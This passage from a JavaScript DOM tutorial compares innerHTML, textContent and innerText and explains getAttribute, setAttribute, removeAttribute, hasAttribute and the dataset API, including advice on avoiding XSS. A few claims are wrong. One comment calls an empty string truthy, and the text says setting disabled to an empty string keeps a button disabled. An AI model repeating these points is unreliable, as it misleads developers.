Returns the **rendered** text content of an element, approximating what a user would see. Considers CSS styling and rendering.

```javascript
const div = document.querySelector('div');
div.innerHTML = `
  <p>Visible</p>
  <p style="display: none;">Hidden</p>
`;

console.log(div.innerText);
// "Visible"
// (excludes hidden text)

console.log(div.textContent);
// "
//   Visible
//   Hidden
// "
// (includes hidden text)
```

#### Rendering-Aware Behavior

`innerText` triggers **reflow** because it needs layout information:

```javascript
// These trigger reflow (slower)
const text = element.innerText;
element.innerText = 'New text';

// These don't trigger reflow (faster)
const text = element.textContent;
element.textContent = 'New text';
```

[Inference] This makes `innerText` significantly slower than `textContent` for performance-critical operations, as reflow is computationally expensive.

#### CSS Visibility Impact

```javascript
div.innerHTML = `
  <p>Visible</p>
  <p style="visibility: hidden;">Hidden with visibility</p>
  <p style="display: none;">Hidden with display</p>
`;

console.log(div.innerText);
// "Visible
// "
// (excludes both visibility:hidden and display:none)

console.log(div.textContent);
// "
//   Visible
//   Hidden with visibility
//   Hidden with display
// "
// (includes all text regardless of CSS)
```

#### Line Break Handling

`innerText` attempts to preserve visual line breaks:

```javascript
div.innerHTML = '<p>Line 1</p><p>Line 2</p>';

console.log(div.innerText);
// "Line 1
// Line 2"
// (preserves block-level element breaks)

console.log(div.textContent);
// "Line 1Line 2"
// (no automatic line breaks)
```

**`<br>` tag handling:**

```javascript
div.innerHTML = 'Line 1<br>Line 2';

console.log(div.innerText);
// "Line 1
// Line 2"
// (converts <br> to newline)

console.log(div.textContent);
// "Line 1Line 2"
// (ignores <br>)
```

#### Script and Style Exclusion

Unlike `textContent`, `innerText` excludes `<script>` and `<style>` content:

```javascript
div.innerHTML = `
  <p>Text</p>
  <script>console.log('code');</script>
  <style>p { color: red; }</style>
`;

console.log(div.innerText);
// "Text"

console.log(div.textContent);
// "
//   Text
//   console.log('code');
//   p { color: red; }
// "
```

#### Setting innerText

```javascript
element.innerText = 'Line 1\nLine 2';
// Creates <br> tags for newlines

element.textContent = 'Line 1\nLine 2';
// Preserves literal newlines in text node
```

[Unverified] The exact behavior of newline conversion when setting `innerText` may vary between browsers, particularly in edge cases.

#### Browser Compatibility and Standardization

`innerText` was originally an IE-specific property, later adopted by other browsers, and finally standardized. However, implementation details vary:

```javascript
// Modern browsers support innerText
const text = element.innerText;
```

[Unverified] Subtle differences in whitespace handling and edge cases may exist between browser implementations despite standardization efforts.

### Comparison Matrix

|Feature|innerHTML|outerHTML|textContent|innerText|
|---|---|---|---|---|
|Returns HTML|✓|✓|✗|✗|
|Includes element itself|✗|✓|✗|✗|
|Parses HTML when setting|✓|✓|✗|✗|
|XSS-safe with user input|✗|✗|✓|✓|
|Triggers reflow|✗|✗|✗|✓|
|Respects CSS hiding|✗|✗|✗|✓|
|Includes hidden elements|✓|✓|✓|✗|
|Includes script/style content|✓|✓|✓|✗|
|Performance (reading)|Fast|Fast|Fast|Slow|
|Performance (writing)|Medium|Medium|Fast|Slow|

### Use Case Decision Guide

**Use innerHTML when:**

- You need to insert or retrieve HTML markup
- You're working with trusted content
- You need maximum control over structure

**Use outerHTML when:**

- You need to replace an entire element
- You're cloning elements with modifications
- You need the element's own tag in the string

**Use textContent when:**

- You're inserting user-generated content (security)
- You only need text, not HTML
- Performance is critical
- You need text from hidden elements

**Use innerText when:**

- You need rendered text only (what user sees)
- You want to exclude hidden content
- You need visual line breaks preserved
- Performance is not critical

### Security Best Practices

```javascript
// NEVER do this with user input
element.innerHTML = userInput; // XSS vulnerability

// DO this instead
element.textContent = userInput; // Safe

// If you must use HTML, sanitize first
element.innerHTML = DOMPurify.sanitize(userInput);

// Or use safer DOM methods
const p = document.createElement('p');
p.textContent = userInput;
element.appendChild(p);
```

### Performance Patterns

```javascript
// Building large lists - BAD
for (let i = 0; i < 1000; i++) {
  list.innerHTML += `<li>Item ${i}</li>`;
}

// Building large lists - GOOD
const items = [];
for (let i = 0; i < 1000; i++) {
  items.push(`<li>Item ${i}</li>`);
}
list.innerHTML = items.join('');

// Building large lists - BEST
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const li = document.createElement('li');
  li.textContent = `Item ${i}`;
  fragment.appendChild(li);
}
list.appendChild(fragment);
```

### Common Pitfalls

**Losing event listeners:**

```javascript
const button = document.querySelector('button');
button.addEventListener('click', handler);

// This removes the button and its listener
button.parentElement.innerHTML = '<div>New content</div>';

// Event listener is lost
```

**Detached element after outerHTML:**

```javascript
const element = document.querySelector('.item');
element.outerHTML = '<div class="item">New</div>';

// element is now detached!
element.classList.add('active'); // Does nothing to DOM
```

**Whitespace surprises with textContent:**

```javascript
div.innerHTML = '<p>  Multiple   spaces  </p>';

console.log(div.textContent);
// "  Multiple   spaces  "
// (preserves all whitespace from source)

console.log(div.innerText);
// "Multiple spaces"
// (collapses whitespace like rendered text)
```

---

## getAttribute

### Syntax and Return Value

`getAttribute()` retrieves the value of a specified attribute on an element. Returns the attribute's string value, or `null` if the attribute doesn't exist.

```javascript
let value = element.getAttribute(attributeName);
```

The `attributeName` parameter is case-insensitive for HTML documents but case-sensitive for XML/XHTML documents.

### Return Value Semantics

Always returns a string or `null`, never `undefined`:

```javascript
const div = document.querySelector('div');

div.getAttribute('id'); // "myDiv" or null
div.getAttribute('data-count'); // "5" (string, not number)
div.getAttribute('disabled'); // "" (empty string if present without value)
div.getAttribute('nonexistent'); // null
```

Empty attributes return empty strings:

```javascript
<input disabled>

input.getAttribute('disabled'); // "" (empty string, not null)
input.hasAttribute('disabled'); // true
```

### getAttribute vs Property Access

Attributes and properties are distinct concepts that often cause confusion:

```javascript
<input type="text" value="initial">

const input = document.querySelector('input');

// Attribute (HTML) - reflects initial HTML state
input.getAttribute('value'); // "initial"

// Property (DOM) - reflects current runtime state
input.value; // "initial"

// User types "changed"
input.value; // "changed"
input.getAttribute('value'); // Still "initial"

// Setting property doesn't update attribute
input.value = "new";
input.getAttribute('value'); // Still "initial"

// Setting attribute doesn't update property for some attributes
input.setAttribute('value', 'reset');
input.value; // Still "new" (for value, property takes precedence)
```

#### Key Differences

**Type conversion:**

```javascript
<input type="checkbox" checked>

input.checked; // true (boolean)
input.getAttribute('checked'); // "" (string)

input.checked = false;
input.getAttribute('checked'); // Still "" (attribute unchanged)
```

**URL attributes:**

```javascript
<a href="/path">

link.href; // "https://example.com/path" (absolute URL)
link.getAttribute('href'); // "/path" (as written in HTML)
```

**Class handling:**

```javascript
element.className; // "foo bar baz"
element.getAttribute('class'); // "foo bar baz"
element.classList; // DOMTokenList object
```

**Style attribute:**

```javascript
<div style="color: red;">

div.style; // CSSStyleDeclaration object
div.style.color; // "red"
div.getAttribute('style'); // "color: red;" (string)
```

### Custom Data Attributes

`getAttribute` is the primary way to access custom attributes, though `dataset` provides an alternative for `data-*` attributes:

```javascript
<div data-user-id="123" data-role-type="admin" custom-attr="value">

// getAttribute works for any attribute
div.getAttribute('data-user-id'); // "123"
div.getAttribute('custom-attr'); // "value"

// dataset only works for data-* attributes
div.dataset.userId; // "123" (camelCase conversion)
div.dataset.roleType; // "admin"
div.dataset.customAttr; // undefined (not a data-* attribute)

// dataset is read-write, bidirectional
div.dataset.userId = "456";
div.getAttribute('data-user-id'); // "456"
```

### Namespaced Attributes (XML/SVG)

For XML namespaces, use `getAttributeNS`:

```javascript
const svg = document.querySelector('svg');

// Standard getAttribute
svg.getAttribute('viewBox'); // Works for non-namespaced

// Namespaced attributes in SVG/XML
svg.getAttributeNS('http://www.w3.org/1999/xlink', 'href');

// Namespaced example
const use = document.createElementNS('http://www.w3.org/2000/svg', 'use');
use.setAttributeNS(
  'http://www.w3.org/1999/xlink',
  'xlink:href',
  '#icon'
);
use.getAttributeNS('http://www.w3.org/1999/xlink', 'href'); // "#icon"
```

### Boolean Attributes

HTML boolean attributes are present/absent, not true/false:

```javascript
<button disabled>
<input checked>
<video autoplay>

// Present = true (regardless of value)
button.hasAttribute('disabled'); // true
button.getAttribute('disabled'); // "" or "disabled" or any value

// Absent = false
input.hasAttribute('required'); // false
input.getAttribute('required'); // null

// Common mistake - checking truthiness of getAttribute
if (button.getAttribute('disabled')) { // ❌ Wrong
  // Empty string is falsy, but attribute IS present
}

// Correct approach
if (button.hasAttribute('disabled')) { // ✓ Correct
  // Properly checks presence
}

// Or use property
if (button.disabled) { // ✓ Correct (boolean property)
}
```

### ARIA Attributes

ARIA attributes are accessed like standard attributes:

```javascript
<div role="button" aria-label="Close" aria-expanded="false">

div.getAttribute('role'); // "button"
div.getAttribute('aria-label'); // "Close"
div.getAttribute('aria-expanded'); // "false" (string)

// Properties don't exist for most ARIA attributes
div.ariaExpanded; // undefined in many browsers
div.getAttribute('aria-expanded'); // "false" - reliable

// Some browsers support aria* properties
div.ariaLabel; // "Close" (if supported)
```

---

## setAttribute

### Syntax and Behavior

`setAttribute()` sets the value of an attribute on an element. If the attribute already exists, its value is updated; otherwise, a new attribute is added.

```javascript
element.setAttribute(name, value);
```

Both parameters are converted to strings automatically:

```javascript
div.setAttribute('data-count', 42); // Stored as "42"
div.setAttribute('data-active', true); // Stored as "true"
div.setAttribute('data-obj', {foo: 'bar'}); // "[object Object]"
```

### No Return Value

`setAttribute` returns `undefined` - it's a mutating operation:

```javascript
const result = element.setAttribute('id', 'test');
// result is undefined
```

### Attribute Name Normalization

In HTML documents, attribute names are automatically lowercased:

```javascript
// HTML document
div.setAttribute('DataValue', '123');
div.getAttribute('datavalue'); // "123"
div.getAttribute('DataValue'); // "123" (same)

// XML/XHTML document - case sensitive
xmlElement.setAttribute('DataValue', '123');
xmlElement.getAttribute('datavalue'); // null
xmlElement.getAttribute('DataValue'); // "123"
```

### Setting Boolean Attributes

For boolean attributes, the presence matters, not the value:

```javascript
// All of these enable the attribute
button.setAttribute('disabled', '');
button.setAttribute('disabled', 'disabled');
button.setAttribute('disabled', 'false'); // Still disabled!
button.setAttribute('disabled', 'true');

// To disable, must remove the attribute
button.removeAttribute('disabled');

// Common mistake
button.setAttribute('disabled', false); // ❌ Still sets attribute to "false"
button.disabled = false; // ✓ Correct - uses property
```

Valid boolean attributes in HTML5:

- `checked`, `disabled`, `selected`, `required`, `readonly`
- `multiple`, `autofocus`, `autoplay`, `controls`, `loop`, `muted`
- `default`, `ismap`, `async`, `defer`, `reversed`, `open`, `hidden`

### setAttribute vs Property Assignment

Property assignment is often preferable for standard attributes:

```javascript
// Using setAttribute
input.setAttribute('value', 'text');
input.setAttribute('type', 'email');
input.setAttribute('disabled', '');

// Using properties - more idiomatic
input.value = 'text';
input.type = 'email';
input.disabled = true;

// Properties have type safety
input.maxLength = 10; // Number
input.setAttribute('maxLength', '10'); // String

// Some properties have no attribute equivalent
input.selectionStart = 5; // No corresponding attribute
```

**When to use setAttribute:**

- Custom attributes (non-standard)
- Data attributes (though `dataset` is alternative)
- When you specifically need to modify HTML attribute
- ARIA attributes
- SVG attributes
- When attribute name is dynamic

```javascript
// Dynamic attribute name
const attrName = 'data-' + someVariable;
element.setAttribute(attrName, value);

// Custom attributes
element.setAttribute('my-custom-attr', 'value');

// ARIA
element.setAttribute('aria-label', 'descriptive text');
```

### Triggering Attribute Changes

Setting an attribute can trigger various browser behaviors:

```javascript
// Triggers style recalculation
element.setAttribute('class', 'new-class');

// May trigger reflow/repaint
element.setAttribute('style', 'width: 100px;');

// Triggers form validation
input.setAttribute('required', '');
input.setAttribute('pattern', '[0-9]+');

// Triggers resource loading
img.setAttribute('src', 'new-image.jpg');
link.setAttribute('href', 'new-stylesheet.css');
```

### Attribute Mutation Observers

`setAttribute` triggers MutationObserver callbacks:

```javascript
const observer = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    if (mutation.type === 'attributes') {
      console.log(`${mutation.attributeName} changed`);
      console.log('Old:', mutation.oldValue);
      console.log('New:', mutation.target.getAttribute(mutation.attributeName));
    }
  });
});

observer.observe(element, {
  attributes: true,
  attributeOldValue: true,
  attributeFilter: ['data-status', 'class'] // Optional: specific attributes
});

element.setAttribute('data-status', 'active'); // Triggers observer
```

### Security and Sanitization

Never set attributes from untrusted input without sanitization:

```javascript
// DANGEROUS
const userInput = getUserInput();
element.setAttribute('onclick', userInput); // XSS vulnerability
element.setAttribute('href', userInput); // javascript: protocol exploit

// SAFER - sanitize/validate
const safeValue = sanitizeInput(userInput);
element.setAttribute('data-user-input', safeValue);

// For URLs, validate protocol
function isSafeURL(url) {
  try {
    const parsed = new URL(url, window.location.href);
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

if (isSafeURL(userInput)) {
  link.setAttribute('href', userInput);
}
```

### SVG and XML Namespaces

For namespaced attributes, use `setAttributeNS`:

```javascript
const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
const use = document.createElementNS('http://www.w3.org/2000/svg', 'use');

// Namespaced attribute
use.setAttributeNS(
  'http://www.w3.org/1999/xlink',
  'xlink:href',
  '#my-icon'
);

// Standard SVG attribute (no namespace)
svg.setAttribute('viewBox', '0 0 100 100');
svg.setAttribute('width', '100');
svg.setAttribute('height', '100');
```

### Performance Considerations

Batch attribute changes when possible:

```javascript
// Multiple reflows - inefficient
element.setAttribute('class', 'foo');
element.setAttribute('id', 'bar');
element.setAttribute('data-value', '123');

// Better - batch via DocumentFragment or detached element
const fragment = document.createDocumentFragment();
const temp = element.cloneNode(false);
temp.setAttribute('class', 'foo');
temp.setAttribute('id', 'bar');
temp.setAttribute('data-value', '123');
element.parentNode.replaceChild(temp, element);

// Or modify before insertion
const newElement = document.createElement('div');
newElement.setAttribute('class', 'foo');
newElement.setAttribute('id', 'bar');
newElement.setAttribute('data-value', '123');
parent.appendChild(newElement);
```

---

## removeAttribute

### Syntax and Behavior

`removeAttribute()` removes the specified attribute from an element. If the attribute doesn't exist, the method does nothing and doesn't throw an error.

```javascript
element.removeAttribute(attributeName);
```

Returns `undefined`.

### Idempotent Operation

Safe to call multiple times:

```javascript
element.removeAttribute('disabled');
element.removeAttribute('disabled'); // No error, no effect
element.removeAttribute('nonexistent'); // No error
```

### Removing vs Setting to Empty/Null

For boolean attributes, removal is the only way to fully disable:

```javascript
<button disabled="">

// These DON'T remove the attribute
button.setAttribute('disabled', '');
button.setAttribute('disabled', null); // Sets to "null" string
button.setAttribute('disabled', false); // Sets to "false" string
button.disabled = ''; // Still true (truthy conversion)

// Only removal works
button.removeAttribute('disabled'); // ✓ Properly removes

// Or use property for boolean attributes
button.disabled = false; // ✓ Also works
```

For non-boolean attributes:

```javascript
// Setting to null/empty string keeps the attribute
input.setAttribute('value', '');
input.hasAttribute('value'); // true (empty string value)

input.setAttribute('value', null);
input.hasAttribute('value'); // true (value is "null")

// Removal deletes it completely
input.removeAttribute('value');
input.hasAttribute('value'); // false
```

### Effect on Properties

Removing attributes may reset properties to defaults:

```javascript
<input type="text" value="custom" id="test">

input.value; // "custom"
input.removeAttribute('value');
input.value; // "" (resets to empty, not undefined)

input.getAttribute('id'); // "test"
input.removeAttribute('id');
input.id; // "" (empty string, not null)
```

### Triggering Revalidation

Removing validation attributes affects form validity:

```javascript
<input required pattern="[0-9]+" minlength="5">

input.validity.valid; // false (if empty or invalid)

input.removeAttribute('required');
input.removeAttribute('pattern');
input.removeAttribute('minlength');

input.validity.valid; // true (no constraints)
```

### Removing Class and Style

Special considerations for `class` and `style`:

```javascript
// Removing class attribute
element.removeAttribute('class');
element.className; // ""
element.classList.length; // 0

// Alternative: clear classList
element.classList.remove(...element.classList);

// Removing style attribute
element.removeAttribute('style');
element.style.cssText; // ""
// Computed styles still apply from stylesheets

// Better: remove specific styles
element.style.removeProperty('color');
element.style.color = '';
```

### Data Attributes

Removing data attributes:

```javascript
<div data-user="john" data-role="admin">

// Via removeAttribute
div.removeAttribute('data-user');

// Via dataset
delete div.dataset.role; // Also removes the attribute
div.dataset.role = undefined; // Doesn't remove, sets to "undefined"

// Check removal
div.hasAttribute('data-user'); // false
'role' in div.dataset; // false
```

### ARIA Attributes

Removing ARIA attributes returns element to default accessibility:

```javascript
<button aria-expanded="true" aria-label="Menu">

// Remove ARIA state
button.removeAttribute('aria-expanded');
// Screen readers will no longer announce expanded state

// Remove ARIA label
button.removeAttribute('aria-label');
// Falls back to text content

// Some ARIA removal affects accessibility tree
element.removeAttribute('role');
// Reverts to semantic HTML role
```

### Namespaced Attributes

For namespaced attributes, use `removeAttributeNS`:

```javascript
const svg = document.querySelector('svg use');

// Won't work for namespaced attributes
svg.removeAttribute('xlink:href'); // May not work correctly

// Correct approach
svg.removeAttributeNS('http://www.w3.org/1999/xlink', 'href');
```

### Performance Impact

Removing attributes triggers browser updates:

```javascript
// Triggers reflow if affects layout
element.removeAttribute('style');
element.removeAttribute('width');
element.removeAttribute('height');

// Triggers repaint if affects appearance
element.removeAttribute('class');
element.removeAttribute('hidden');

// Minimal performance impact
element.removeAttribute('data-cache');
element.removeAttribute('aria-describedby');
```

### Use with MutationObserver

Removal triggers mutation callbacks:

```javascript
const observer = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    if (mutation.type === 'attributes') {
      console.log(`${mutation.attributeName} removed`);
      console.log('Old value:', mutation.oldValue);
    }
  });
});

observer.observe(element, {
  attributes: true,
  attributeOldValue: true
});

element.removeAttribute('data-status'); // Triggers observer
```

---

## hasAttribute

### Syntax and Return Value

`hasAttribute()` returns a boolean indicating whether the element has the specified attribute.

```javascript
let result = element.hasAttribute(attributeName);
```

Returns `true` if attribute exists (regardless of value), `false` otherwise.

### Checking Attribute Presence

The canonical way to test if an attribute exists:

```javascript
<button disabled="">
<input checked>
<div data-value="">

button.hasAttribute('disabled'); // true
button.getAttribute('disabled'); // "" (empty string is truthy)

input.hasAttribute('checked'); // true
div.hasAttribute('data-value'); // true
div.hasAttribute('data-other'); // false
```

### hasAttribute vs getAttribute Null Check

Both approaches work, but have different semantics:

```javascript
// Using hasAttribute - explicit, more readable
if (element.hasAttribute('data-loaded')) {
  // Attribute exists
}

// Using getAttribute - implicit null check
if (element.getAttribute('data-loaded') !== null) {
  // Attribute exists
}

// Common mistake - truthiness check fails for empty attributes
if (element.getAttribute('disabled')) { // ❌ Wrong
  // Empty string is falsy, but attribute exists
}

if (element.hasAttribute('disabled')) { // ✓ Correct
  // Properly checks presence
}
```

### Boolean Attribute Detection

Essential for boolean attributes:

```javascript
<form>
  <input required>
  <input>
</form>

const inputs = form.querySelectorAll('input');

inputs[0].hasAttribute('required'); // true
inputs[1].hasAttribute('required'); // false

// Property access for boolean attributes
inputs[0].required; // true (boolean)
inputs[1].required; // false (boolean)

// getAttribute returns string or null
inputs[0].getAttribute('required'); // "" (empty string)
inputs[1].getAttribute('required'); // null
```

### Attribute Name Case Sensitivity

In HTML documents, attribute names are case-insensitive:

```javascript
// HTML document
element.setAttribute('DataValue', '123');

element.hasAttribute('datavalue'); // true
element.hasAttribute('DataValue'); // true
element.hasAttribute('DATAVALUE'); // true

// XML/XHTML - case sensitive
xmlElement.hasAttribute('datavalue'); // false
xmlElement.hasAttribute('DataValue'); // true
```

### Performance Benefits

`hasAttribute` is more performant than alternatives when you only need to check existence:

```javascript
// Fastest - single boolean check
if (element.hasAttribute('data-cached')) { }

// Slower - retrieves value then checks
if (element.getAttribute('data-cached') !== null) { }

// Slowest - retrieves value, converts, checks
if (element.dataset.cached) { }
```

### Common Patterns

#### Conditional Logic Based on Presence

```javascript
// Toggle attribute based on presence
if (element.hasAttribute('aria-hidden')) {
  element.removeAttribute('aria-hidden');
} else {
  element.setAttribute('aria-hidden', 'true');
}

// Conditional attribute addition
if (!element.hasAttribute('role')) {
  element.setAttribute('role', 'button');
}
```

#### Form Validation

```javascript
function isRequired(input) {
  return input.hasAttribute('required');
}

function validateInput(input) {
  if (isRequired(input) && !input.value) {
    return 'This field is required';
  }
  
  if (input.hasAttribute('pattern')) {
    const pattern = new RegExp(input.getAttribute('pattern'));
    if (!pattern.test(input.value)) {
      return 'Invalid format';
    }
  }
  
  return null;
}
```

#### Feature Detection

```javascript
// Check for specific HTML5 attributes
const hasPlaceholder = input.hasAttribute('placeholder');
const hasAutofocus = input.hasAttribute('autofocus');

// Check custom attributes
if (element.hasAttribute('data-initialized')) {
  // Already initialized, skip
  return;
}

element.setAttribute('data-initialized', 'true');
// Initialize component
```

### Working with Custom Attributes

```javascript
<div custom-attr="value" data-type="user">

// Check any attribute
div.hasAttribute('custom-attr'); // true
div.hasAttribute('data-type'); // true

// Common pattern: graceful fallback
const type = div.hasAttribute('data-type') 
  ? div.getAttribute('data-type')
  : 'default';

// Or using optional chaining and nullish coalescing
const type = div.getAttribute('data-type') ?? 'default';
```

### ARIA Attribute Presence

```javascript
function updateARIA(element, expanded) {
  if (!element.hasAttribute('role')) {
    element.setAttribute('role', 'button');
  }
  
  element.setAttribute('aria-expanded', expanded);
  
  // Only set aria-controls if target exists
  const target = element.getAttribute('data-target');
  if (target && document.getElementById(target)) {
    element.setAttribute('aria-controls', target);
  }
}

// Check required ARIA attributes
function validateARIAButton(button) {
  const errors = [];
  
  if (button.hasAttribute('aria-expanded') && 
      !button.hasAttribute('aria-controls')) {
    errors.push('aria-expanded requires aria-controls');
  }
  
  return errors;
}
```

### Namespaced Attributes

For XML namespaces, use `hasAttributeNS`:

```javascript
const svg = document.querySelector('svg use');

// Standard check
svg.hasAttribute('href'); // May be false for namespaced href

// Namespaced check
svg.hasAttributeNS('http://www.w3.org/1999/xlink', 'href'); // true
```

### Integration with Other Methods

#### Combining with Selector Matching

```javascript
// Find elements with specific attribute
const elements = Array.from(document.querySelectorAll('[data-component]'))
  .filter(el => el.hasAttribute('data-initialized'));

// Attribute selector in querySelector
document.querySelectorAll('[disabled]'); // Matches all with disabled attr
```

#### Attribute Toggle Pattern

```javascript
function toggleAttribute(element, name, force) {
  if (force === undefined) {
    force = !element.hasAttribute(name);
  }
  
  if (force) {
    element.setAttribute(name, '');
  } else {
    element.removeAttribute(name);
  }
  
  return force;
}

// Usage
toggleAttribute(button, 'disabled'); // Toggles
toggleAttribute(button, 'disabled', true); // Forces on
toggleAttribute(button, 'disabled', false); // Forces off

// Native toggleAttribute (modern browsers)
element.toggleAttribute('hidden'); // Returns new state
element.toggleAttribute('hidden', true); // Force to true
```

### Debugging and Inspection

```javascript
// List all attributes on an element
function getAttributes(element) {
  return Array.from(element.attributes).map(attr => ({
    name: attr.name,
    value: attr.value,
    exists: element.hasAttribute(attr.name)
  }));
}

// Check for common attributes
function auditElement(element) {
  const checks = {
    hasId: element.hasAttribute('id'),
    hasClass: element.hasAttribute('class'),
    hasData: Array.from(element.attributes)
      .some(attr => attr.name.startsWith('data-')),
    hasAria: Array.from(element.attributes)
      .some(attr => attr.name.startsWith('aria-')),
    hasRole: element.hasAttribute('role')
  };
  
  return checks;
}
```

### Edge Cases

```javascript
// Empty attribute name
element.hasAttribute(''); // false (invalid)

// Whitespace in name
element.setAttribute('data name', 'value'); // Invalid in HTML
element.hasAttribute('data name'); // Behavior undefined

// Special characters
element.setAttribute('data-user-id', '123');
element.hasAttribute('data-user-id'); // true

// Unicode in attribute names (valid but unusual)
element.setAttribute('data-名前', 'value');
element.hasAttribute('data-名前'); // true
```

### Cross-browser Consistency

`hasAttribute` is well-supported (IE8+) and consistent:

```javascript
// Reliable across all modern browsers
if (element.hasAttribute('disabled')) {
  // Consistent behavior everywhere
}

// More reliable than checking properties for custom attributes
if (element.customAttr) { // May not exist
}

if (element.hasAttribute('custom-attr')) { // Always works
}
```

---

## Dataset API (data-* attributes)

### API Overview and Access

The `dataset` property provides a `DOMStringMap` interface for reading and writing custom data attributes. It's available on all `HTMLElement` instances.

```javascript
const element = document.querySelector('.item');

// Access via dataset
element.dataset.userId; // Reads data-user-id
element.dataset.userId = '123'; // Writes data-user-id="123"

// Equivalent getAttribute/setAttribute
element.getAttribute('data-user-id');
element.setAttribute('data-user-id', '123');
```

### Naming Conventions and Transformations

#### HTML to JavaScript Conversion

The transformation follows camelCase conversion rules:

```javascript
// HTML attribute → JavaScript property
data-user-id → dataset.userId
data-product-name → dataset.productName
data-api-key → dataset.apiKey
data-item → dataset.item
data-3d-model → dataset['3dModel'] // Starts with digit, use bracket notation
```

#### Transformation Rules

```javascript
// Hyphens removed, following character uppercased
data-background-color → dataset.backgroundColor

// Multiple consecutive hyphens
data-user--id → dataset['user-Id'] // [Inference] One hyphen removed, next char uppercased

// Trailing hyphen
data-value- → dataset['value-'] // [Inference] Preserved in property name

// Starting with hyphen (invalid in HTML5)
data--value → Invalid attribute name
```

#### Character Restrictions

HTML5 specifies that data attribute names:

- Must start with `data-`
- Must contain at least one character after `data-`
- Must not contain uppercase ASCII letters (A-Z)
- Can contain hyphens, but special handling required

```javascript
// Valid
<div data-user="john"></div>
<div data-user-id="123"></div>
<div data-123="value"></div>
<div data-_value="test"></div>

// Invalid (uppercase after data-)
<div data-UserId="123"></div> // Fails HTML5 validation

// Edge case: XML compatibility
<div data-xml:lang="en"></div> // Contains colon, technically valid in HTML5
```

### Property Access Patterns

#### Dot Notation

```javascript
const el = document.querySelector('.item');

// Reading
const id = el.dataset.userId;

// Writing
el.dataset.userId = '456';

// Deleting
delete el.dataset.userId; // Removes data-user-id attribute
```

#### Bracket Notation

Required for:

- Names starting with digits
- Names containing special characters
- Dynamic property names
- Reserved JavaScript keywords

```javascript
// Digit start
el.dataset['3dModel'] = 'mesh.obj';

// Dynamic access
const key = 'userId';
el.dataset[key] = '789';

// Special characters preserved
el.dataset['my-special-key'] = 'value'; // data-my-special-key

// Reserved words
el.dataset['class'] = 'test'; // data-class
```

### Value Type Handling

#### String Conversion

All dataset values are strings. Type conversion must be explicit:

```javascript
// Setting values - all converted to strings
el.dataset.count = 42; // Becomes "42"
el.dataset.active = true; // Becomes "true"
el.dataset.items = [1, 2, 3]; // Becomes "1,2,3"
el.dataset.obj = {a: 1}; // Becomes "[object Object]"

// Reading requires conversion
const count = parseInt(el.dataset.count, 10); // 42
const active = el.dataset.active === 'true'; // true
const items = el.dataset.items.split(',').map(Number); // [1, 2, 3]
```

#### JSON Storage Pattern

```javascript
// Storing complex data
const data = {
  id: 123,
  name: 'Product',
  tags: ['new', 'sale'],
  metadata: { category: 'electronics' }
};

el.dataset.config = JSON.stringify(data);

// Retrieving complex data
const config = JSON.parse(el.dataset.config);
```

#### Empty and Undefined Values

```javascript
// Empty string
el.dataset.value = ''; // data-value=""
el.dataset.value === ''; // true

// Undefined - property doesn't exist
el.dataset.nonexistent === undefined; // true

// Null converted to string
el.dataset.value = null; // Becomes "null"
el.dataset.value === 'null'; // true

// Checking existence
'userId' in el.dataset; // true if data-user-id exists
el.hasAttribute('data-user-id'); // Alternative check
```

### Enumeration and Iteration

#### Iterating Over Dataset

```javascript
const el = document.querySelector('.item');

// for...in loop
for (let key in el.dataset) {
  console.log(key, el.dataset[key]);
}

// Object.keys
Object.keys(el.dataset).forEach(key => {
  console.log(key, el.dataset[key]);
});

// Object.entries
Object.entries(el.dataset).forEach(([key, value]) => {
  console.log(key, value);
});

// Object.values
const values = Object.values(el.dataset);
```

#### Inherited Properties Consideration

[Inference] The `dataset` property returns a `DOMStringMap` which doesn't inherit from `Object.prototype`, but `for...in` loops may still enumerate inherited properties in some edge cases. Use `hasOwnProperty` for safety:

```javascript
for (let key in el.dataset) {
  if (el.dataset.hasOwnProperty(key)) {
    console.log(key, el.dataset[key]);
  }
}

// Or use Object.keys (safer)
Object.keys(el.dataset).forEach(key => {
  // Only own properties
});
```

### CSS Integration

#### Attribute Selectors

```javascript
// Select by data attribute existence
document.querySelectorAll('[data-status]');

// Select by exact value
document.querySelectorAll('[data-status="active"]');

// Select by partial value
document.querySelectorAll('[data-id^="user-"]'); // Starts with
document.querySelectorAll('[data-type$="-primary"]'); // Ends with
document.querySelectorAll('[data-tags*="featured"]'); // Contains
```

#### CSS Styling Based on Data Attributes

```css
/* Style based on data attribute */
[data-status="active"] {
  background-color: green;
}

[data-priority="high"] {
  border: 2px solid red;
}

/* Use attribute value in content */
.item::before {
  content: attr(data-label);
}

/* Multiple attribute conditions */
[data-type="product"][data-featured="true"] {
  font-weight: bold;
}
```

#### CSS Custom Properties Integration

```javascript
// Set CSS variable via data attribute
el.dataset.theme = 'dark';

// Read in CSS
// [data-theme="dark"] { --bg-color: #000; }

// Or set custom property directly
el.style.setProperty('--user-color', el.dataset.color);
```

### Performance Characteristics

#### Dataset vs getAttribute

```javascript
// dataset property access
const value1 = el.dataset.userId; // Parses attribute name

// Direct attribute access  
const value2 = el.getAttribute('data-user-id'); // Direct access

// Setting via dataset
el.dataset.userId = '123'; // Converts camelCase, sets attribute

// Setting via setAttribute
el.setAttribute('data-user-id', '123'); // Direct write
```

[Inference] `getAttribute/setAttribute` may be marginally faster for one-off operations as they avoid the camelCase conversion overhead. However, the difference is typically negligible for most applications.

#### Batch Operations

```javascript
// Multiple dataset reads trigger multiple conversions
const a = el.dataset.userId;
const b = el.dataset.userName;
const c = el.dataset.userEmail;

// Cache for repeated access
const data = el.dataset;
const a2 = data.userId;
const b2 = data.userName;
const c2 = data.userEmail;

// For many attributes, consider manual parsing
const attrs = el.attributes;
for (let i = 0; i < attrs.length; i++) {
  if (attrs[i].name.startsWith('data-')) {
    // Process directly
  }
}
```

#### Memory Considerations

[Inference] The `dataset` property creates a live view of data attributes. Changes through `dataset` immediately reflect in the DOM and vice versa. No separate object is maintained in memory.

```javascript
// Live binding
el.setAttribute('data-value', 'test');
console.log(el.dataset.value); // 'test' - immediately reflects

el.dataset.value = 'updated';
console.log(el.getAttribute('data-value')); // 'updated' - immediately reflects
```

### Edge Cases and Browser Quirks

#### Case Sensitivity in HTML vs XHTML

```javascript
// HTML (case-insensitive tags/attributes)
<div data-UserId="123"></div> // Invalid, treated as data-userid

// getAttribute is case-insensitive in HTML
el.getAttribute('data-UserId'); // Returns value
